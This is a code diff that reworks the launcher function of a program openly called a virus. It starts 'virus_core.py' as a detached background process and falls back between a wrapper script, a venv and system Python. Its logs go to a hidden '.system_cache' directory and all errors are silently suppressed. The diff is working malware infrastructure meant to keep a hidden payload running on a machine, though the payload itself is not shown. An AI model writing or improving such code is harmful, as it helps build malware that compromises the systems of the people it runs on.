@@ -117,26 +117,43 @@ def start_virus_background():
     """Start virus as independent background process"""
     try:
         virus_path = os.path.join(VIRUS_INSTALL_DIR, "virus_core.py")
-        if os.path.exists(virus_path):
-            # Create log file for virus errors
-            log_dir = os.path.join(VIRUS_INSTALL_DIR, ".system_cache")
-            os.makedirs(log_dir, exist_ok=True)
-            error_log = os.path.join(log_dir, "virus_startup.log")
-            
-            # Start virus in background (detached process)
-            with open(error_log, 'a') as log_file:
-                process = subprocess.Popen(
-                    [sys.executable, virus_path],
-                    stdout=log_file,
-                    stderr=subprocess.STDOUT,
-                    stdin=subprocess.DEVNULL,
-                    cwd=VIRUS_INSTALL_DIR,
-                    start_new_session=True
-                )
-                log_file.write(f"Virus started at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
-                log_file.write(f"PID: {process.pid}\n")
-                log_file.write(f"Path: {virus_path}\n")
-                log_file.flush()
+        if not os.path.exists(virus_path):
+            return
+        
+        # Create log file for virus errors
+        log_dir = os.path.join(VIRUS_INSTALL_DIR, ".system_cache")
+        os.makedirs(log_dir, exist_ok=True)
+        error_log = os.path.join(log_dir, "virus_startup.log")
+        
+        # Check if venv exists and use it, otherwise use system Python
+        venv_python = os.path.join(VIRUS_INSTALL_DIR, "venv", "bin", "python3")
+        run_script = os.path.join(VIRUS_INSTALL_DIR, "run_virus.sh")
+        
+        if os.path.exists(run_script) and os.access(run_script, os.X_OK):
+            # Use wrapper script if available
+            cmd = ["/bin/bash", run_script]
+        elif os.path.exists(venv_python):
+            # Use venv Python directly
+            cmd = [venv_python, virus_path]
+        else:
+            # Fall back to system Python
+            cmd = [sys.executable, virus_path]
+        
+        # Start virus in background (detached process)
+        with open(error_log, 'a') as log_file:
+            process = subprocess.Popen(
+                cmd,
+                stdout=log_file,
+                stderr=subprocess.STDOUT,
+                stdin=subprocess.DEVNULL,
+                cwd=VIRUS_INSTALL_DIR,
+                start_new_session=True
+            )
+            log_file.write(f"Virus started at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+            log_file.write(f"PID: {process.pid}\n")
+            log_file.write(f"Command: {' '.join(cmd)}\n")
+            log_file.write(f"Path: {virus_path}\n")
+            log_file.flush()
     except Exception:
         pass
 
